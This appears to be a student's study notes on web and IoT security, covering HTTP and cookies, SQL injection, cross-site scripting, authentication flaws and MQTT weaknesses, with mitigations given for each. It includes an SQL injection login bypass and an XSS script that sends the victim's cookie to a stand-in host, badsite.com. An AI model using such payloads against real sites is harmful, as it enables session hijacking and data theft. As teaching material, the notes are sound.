# Web and IoT Security

## Security in the web

### Basics of a Web Application

A web application is made on the client/server model: they send each other messages in a *request-response messaging pattern*. We remember that all client-server protocol operate in the *Application Layer*.

**HTTP** stands for Hyper Text Transfer Protocol and it is a *stateless, application-level protocol* for exchanging information between systems. It is connectionless, media independent and stateless.

```http
HTTP/1.0 200 OK
Date: Sun, 21 Apr 1996 02:20:42 GMT
Server: Google
Connection: keep-alive
Content-Type: text/html
Set-Cookie: ...
Content-Length: 2543
<html>...</html>
```

*Up here you can see HTTP version, status code, headers, cookies and the body*

We can add a **state** to HTTP thanks to **Cookies**: cookies are small piece of data sent together with the request to remember information (ie. a shopping cart) or record user's browser activity. 

Cookies are usually used for **authentication** to know whether the user is logged in or not. However security vulnerabilities might allow cookies' data to be read by a hacker wich than can gain access to user data or the website. They also are a **privacy concern** because of tracking cookies.

Because cookies are exchanged in clear you should use https.

### Secure a Web Application

Creating a secure Web application is not an easy task because many security flaws can happen at many levels (db, sevrer, app, network). Every layer must be examined.

Example of vulnerabilities are:

- Application layer
  
  - SQL Injection
  
  - Cross-Site-Scripting
  
  - CSFR, Broken Auth, Unvalidated Input

- Server Layer
  
  - DoS
  
  - OS Explitation

- Network Layer
  
  - MITM
  
  - DNS Attack
  
  - Packet-Sniffing

- User Layer
  
  - Phishing
  
  - Key Logging
  
  - Malware

A web application should be able to grant: **Authentication, Authorization, Confidentiality, Integrity, Non-Repudiation**.

Goals of **Web Application Security** (a branch of Information Security) is to secure web and mobile apps and safen browsing the web

### SQL Injection

A SQL injection is  a code injection technique used to attack data-drive applications. It consist in inserting into a non-sanitized field SQL statements which will be executed.

```sql
SELECT * FROM Users
WHERE username = 'admin';-- AND password = 'pass123'
```

*In the example above the input field is ``'admin';--`` and the password requirement in the SQL query is ignored as a comment returning the view of an admin*.

Other types of SQL injection use wildcards, `... OR 1=1` always true statements. Basically a SQL injection is present when **dynamic queries** are built.

> Case Study: CardSystem (in June 2005) was a credit card payment processing company. A SQL injection exposed 43M credit cards.

**Mitigations:**

- Input sanitization

- Principle of The Least Priviledge

### Cross-Site Scripting Attacks (XSS)

Cross-site scripting (XSS) is a security vulnerability were attackers are able to inject clinet-side scripts into a user visited website. 

```html
http://vulnerable.com/welcome.php?name=
<script>
window.open ("http://badsite.com/collect.php?cookie= "+document.cookie)
</script>
```

*The idea is to forward the cookie of the user to the attacker site so that it can exploit it (reflected attack)*

Another way of doing XSS is through forms, loading malicious code in a filed and doing a POST request (*stored attack*).

With XSS the hacker can impersonate the victim.

**MItigations:** 

- Filter input parameters (better to use positive filtering)

### Other Attacks

**Unvalidated Input**

```html
<form action="page.asp" method="post">
    <input type="hidden" name="price" value="20.00">
    <input type="submit">
</form>
```

*A user could easily change the value client side and than send the request*

Always validate **server side**!

**Broken Authentication**

Common combination of usernames and passwords are broken.

Causes may be insecure storage, weak algorithm, faulty session management or passwords recovery.

Mitigations are to disallow weak passwords, use HTTPS and MFA, salt and has passwords

**Session Management**

Session information is equally important to protect. Poor management can leed to CSFR (Cross-Site Request Forgery), spoofing and more. 

MItigation consist in implementing strict timeouts and ensure unique and renewed Session IDs.

### Access Control in Web Application

> Case Study: The Equifax Breach
> 
> It was a **command injection attack** where hackers could execute arbitrary commands in Apache Struts. Patches were available **but not applied**.

*Security best practices dictate that this user have as little privilege as possible 
on the server itself, since security vulnerabilities in web applications and web 
servers are so commonly exploited.*

### Conclusion

It is a good idea to use automated soltions for analysis and enforcement of security policies (ie. tools, firewalls, Cloudflare).

**The OWASP Top 10** 

[OWASP Top 10:2021](https://owasp.org/Top10/)

![](/home/samu/Documents/Markdown/images/ComputerAndNetworkSecurity/OWASP.png)

## IoT Security

### Basics of IoT Applications

They usually use a **publish-subscribe** communication. It is a many-to-many communication model. Parties doesn't need to know each other and act at the same time. Synchronization is not needed.

![](/home/samu/.config/marktext/images/2022-12-13-23-59-23-image.png)

*Subjects are publishers, subscribers, a broker and a Notification service*

A more advanced model uses **topics** so that subscribers listen to "categories". Topics can be organized by **hierarchy**.

The **Event Notification System** can be centralized or distributed.

### MQTT

MQTT stands for Message Queue Telemetry Transport. It follows the publisher/subscriber pattern, has hierarchy, simple packets and runs over TCP (*not encrypted by default*)

It is designed to minimise network bandwith, run on small resources and be sort of reliable.

By default all data are in clear; however encryption is possible using **TLS**. The side effect is a significant network overhead. Additional security measures can added.

**Authentication** is possible through the `CONNECT` packet.

Security flaws rounds down to:

- Brute-force Attacks (no limit on number of attempts)

- Abuse of Wildcards in topic subscriptions (possibly system packets)
